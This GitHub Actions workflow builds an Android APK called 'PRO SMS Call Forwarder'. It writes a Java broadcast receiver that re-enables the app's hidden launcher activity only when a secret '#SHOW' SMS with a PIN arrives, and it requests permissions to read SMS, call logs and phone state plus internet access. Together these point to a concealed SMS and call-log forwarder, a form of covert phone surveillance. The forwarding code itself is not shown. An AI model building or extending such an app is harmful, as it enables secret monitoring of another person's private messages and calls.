name: Build APK

on: [push]

jobs:
  build:
    runs-on: ubuntu-22.04

    steps:
      - uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.10'

      - name: Install system dependencies
        run: |
          sudo apt-get update
          sudo apt-get install -y \
            python3-pip \
            build-essential \
            git \
            zip \
            unzip \
            openjdk-17-jdk \
            autoconf \
            libtool \
            pkg-config \
            zlib1g-dev \
            libncurses5-dev \
            libncursesw5-dev \
            libncurses5 \
            cmake \
            libffi-dev \
            libssl-dev

      - name: Install Python dependencies
        run: |
          pip install --upgrade pip
          pip install buildozer==1.5.0 cython==0.29.37

      - name: Create App Source Directory Structure
        run: |
          mkdir -p android_src/src/org/hamza

      - name: Create Secure Custom Android BroadcastReceiver
        run: |
          cat << 'EOF' > android_src/src/org/hamza/SmsReceiver.java
          package org.hamza;

          import android.content.BroadcastReceiver;
          import android.content.Context;
          import android.content.Intent;
          import android.os.Bundle;
          import android.telephony.SmsMessage;
          import android.content.pm.PackageManager;
          import android.content.ComponentName;
          import java.io.File;
          import java.io.FileInputStream;
          import org.json.JSONObject;

          public class SmsReceiver extends BroadcastReceiver {
              @Override
              public void onReceive(Context context, Intent intent) {
                  if ("android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
                      Bundle bundle = intent.getExtras();
                      if (bundle != null) {
                          Object[] pdus = (Object[]) bundle.get("pdus");
                          if (pdus != null) {
                              for (Object pdu : pdus) {
                                  SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                                  String msgBody = sms.getMessageBody();
                                  if (msgBody == null) continue;
                                  
                                  msgBody = msgBody.trim();
                                  
                                  if (msgBody.startsWith("#SHOW")) {
                                      String targetPin = "1234"; // الرمز الافتراضي الاحتياطي
                                      try {
                                          // قراءة الـ PIN الحقيقي الذي وضعه المستخدم في الإعدادات بشكل ديناميكي
                                          File cfgFile = new File(System.getProperty("user.home") + "/.smsfwd.json");
                                          if (cfgFile.exists()) {
                                              FileInputStream fis = new FileInputStream(cfgFile);
                                              byte[] data = new byte[(int) cfgFile.length()];
                                              fis.read(data);
                                              fis.close();
                                              JSONObject json = new JSONObject(new String(data, "UTF-8"));
                                              if (json.has("pin_code")) {
                                                  targetPin = json.getString("pin_code");
                                              }
                                          }
                                      } catch (Exception e) {
                                          // تجاهل أخطاء القراءة واستخدام الافتراضي
                                      }
                                      
                                      // التحقق الأمني: يجب أن تكون الرسالة مثلاً "#SHOW 1234"
                                      if (msgBody.equals("#SHOW " + targetPin)) {
                                          PackageManager pm = context.getPackageManager();
                                          ComponentName compName = new ComponentName(context.getPackageName(), "org.kivy.android.PythonActivity");
                                          pm.setComponentEnabledSetting(
                                              compName,
                                              PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                                              PackageManager.DONT_KILL_APP
                                          );
                                      }
                                  }
                              }
                          }
                      }
                  }
              }
          }
          EOF

      - name: Create buildozer.spec Safely
        run: |
          python3 -c "
          spec = '''[app]
          title = PRO SMS Call Forwarder
          package.name = prosmsforwarder
          package.domain = org.hamza
          source.dir = .
          source.include_exts = py,png,jpg,kv,atlas,json,java
          version = 2.2
          requirements = python3,kivy==2.3.0,openssl,requests
          orientation = portrait
          fullscreen = 0
          android.permissions = READ_SMS,RECEIVE_SMS,READ_CALL_LOG,READ_PHONE_STATE,INTERNET,WAKE_LOCK
          android.api = 33
          android.minapi = 21
          android.ndk = 25
          android.archs = arm64-v8a
          
          android.add_src = android_src/src
          android.manifest.manifest_receivers = org.hamza.SmsReceiver

          [buildozer]
          log_level = 2
          warn_on_root = 1
          '''
          with open('buildozer.spec', 'w') as f:
              f.write(spec.strip())
          "

      - name: Build APK
        run: yes | buildozer -v android debug

      - name: Upload APK
        uses: actions/upload-artifact@v4
        with:
          name: PRO-SMS-Forwarder-APK
          path: bin/*.apk
          if-no-files-found: warn
